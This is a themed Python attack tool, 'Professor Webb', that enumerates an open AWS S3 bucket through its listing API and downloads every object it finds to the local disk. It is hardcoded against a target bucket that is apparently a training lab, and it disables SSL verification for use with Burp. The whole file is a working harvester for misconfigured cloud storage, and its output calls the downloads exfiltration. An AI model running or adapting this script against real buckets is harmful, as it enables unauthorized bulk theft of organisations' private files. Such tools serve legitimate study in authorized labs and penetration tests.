#!/usr/bin/env python3
"""
Tool Name: profess3rwebb.py
Author: Erick Tafel (g1gs)
Purpose: Lightweight AWS S3 bucket directory mapper and file harvester with H.P. Lovecraft theme.
"""

import requests
import re
import os
import urllib3

# Quiet the SSL warnings as we peer into the deep (common for proxying through Burp)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 1. TARGET BUCKET URL: Change the base domain to match your target bucket. Optional: Capture in Burp and Copy As Python (extension)
# Keep the parameters intact (?list-type=2...) as they force AWS to return the XML map.
target_url = "https://s3.amazonaws.com/dev.huge-logistics.com?list-type=2&prefix=&delimiter=%2F&encoding-type=url"

# 2. BASE TARGET DOMAIN: The base path format used for direct object downloads.
bucket_base_url = "https://s3.amazonaws.com/dev.huge-logistics.com"

# 3. LOCAL STORAGE DIRECTORY: Where collected files will be saved on your system.
local_dir = 'dev.huge-logistics.com'

print(f"[*] Professor Webb initiating expedition against: {bucket_base_url}")
initial_response = requests.get(target_url)

if initial_response.status_code == 200:
    # Parsing out the root-level folder structures (<Prefix> tags represent directories)
    directories = re.findall(r'<Prefix>(.*?)</Prefix>', initial_response.text)
    print('[+] Structural vault paths mapped by Professor Webb:')
    
    for directory in directories:
        if directory == '':
            print('  -> / (Root Vault)')
        else:
            print(f'  -> {directory}')
            
        # Querying the sub-directory path to find nested objects
        sub_dir_url = f"{bucket_base_url}?list-type=2&prefix={directory}&delimiter=%2F&encoding-type=url"   
        sub_dir_response = requests.get(sub_dir_url)
        
        if sub_dir_response.status_code == 200:
            # Extracting the files (<Key> tags represent actual object keys/files)
            files = re.findall(r'<Key>(.*?)</Key>', sub_dir_response.text)
            
            for file_name in files:
                # Deduplicate folder names matching file names
                if file_name == directory:
                    pass
                else:
                    print(f'    [*] Fragment Located: {file_name}')
                    download_url = f'{bucket_base_url}/{file_name}'
                    print(f'    [~] Exfiltrating {file_name} for translation...')
                    
                    # Streaming the data down locally to prevent memory flooding
                    file_response = requests.get(download_url, stream=True, verify=False)
                        
                    if file_response.status_code == 200:
                        if not file_name.endswith('/'):
                            file_path = os.path.join(local_dir, file_name)
                            
                            # Ensure local directory tree mimics the bucket layout
                            os.makedirs(os.path.dirname(file_path), exist_ok=True)
                            
                            with open(file_path, 'wb') as f:
                                for chunk in file_response.iter_content(1024):
                                    f.write(chunk)
                            print(f'    [+] {file_name} safely archived in the library.')
                                
        elif sub_dir_response.status_code == 403:
            print(f'    [-] Sanity Check: Access to deeper vault path [{directory}] is sealed (403).')
        else:
            print('    [-] The portal fluctuated. Unable to read this path.')

elif initial_response.status_code == 404:
    print('[-] The targeted site does not exist in this waking world (404).')
elif initial_response.status_code == 403:
    print('[-] Sanity Check: The entire outer vault is completely sealed against us (403).')
else:
    print('[-] An unknown cosmic interference is blocking our requests.')